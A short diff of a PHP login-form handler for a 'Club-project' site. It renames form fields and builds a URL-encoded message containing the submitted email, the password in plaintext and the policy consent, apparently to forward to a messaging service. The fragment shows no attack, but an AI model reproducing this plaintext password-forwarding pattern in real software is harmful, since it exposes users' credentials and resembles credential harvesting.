@@ -9,20 +9,20 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
  
   $textSendStatus = '';
    
-  if (!empty($_POST['autorization-email']) && !empty($_POST['autorization-password']) && !empty($_POST['autorization-checkbox'])) {
+  if (!empty($_POST['email']) && !empty($_POST['password']) && !empty($_POST['checkbox'])) {
      
     $txt = "Club-project%0AВход%0A%0A";
      
-    if (isset($_POST['autorization-email']) && !empty($_POST['autorization-email'])) {
-        $txt .= "Почта: " . strip_tags(urlencode($_POST['autorization-email'])) . "%0A";
+    if (isset($_POST['email']) && !empty($_POST['email'])) {
+        $txt .= "Почта: " . strip_tags(urlencode($_POST['email'])) . "%0A";
     }
 
-    if (isset($_POST['autorization-password']) && !empty($_POST['autorization-password'])) {
-      $txt .= "Пароль: " . strip_tags(urlencode($_POST['autorization-password'])) . "%0A";
+    if (isset($_POST['password']) && !empty($_POST['password'])) {
+      $txt .= "Пароль: " . strip_tags(urlencode($_POST['password'])) . "%0A";
   }
 
-  if (isset($_POST['autorization-checkbox']) && !empty($_POST['autorization-checkbox'])) {
-    $txt .= "Согласие с политикой: " . strip_tags(urlencode($_POST['autorization-checkbox'])) . "%0A";
+  if (isset($_POST['checkbox']) && !empty($_POST['checkbox'])) {
+    $txt .= "Согласие с политикой: " . strip_tags(urlencode($_POST['checkbox'])) . "%0A";
   }
 
 
